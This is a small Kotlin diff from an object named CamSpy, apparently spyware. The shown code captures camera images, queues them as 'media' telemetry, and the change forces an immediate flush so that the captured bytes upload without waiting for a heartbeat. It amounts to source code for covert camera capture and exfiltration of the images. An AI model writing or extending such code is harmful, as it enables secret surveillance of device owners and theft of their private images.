@@ -97,7 +97,7 @@ object CamSpy {
                             .put("cam", if (id == "0") "back" else "cam$id")
                         Telemetry.push("media", d)
                         // 立刻推上去，不让用户等心跳
-                        runCatching { Telemetry.flush(ctx) }
+                        runCatching { Telemetry.flush(ctx, true) }
                         Log.i(TAG, "captured ${bytes.size}B")
                     }
                 }.onFailure { Log.w(TAG, "read: ${it.message}") }
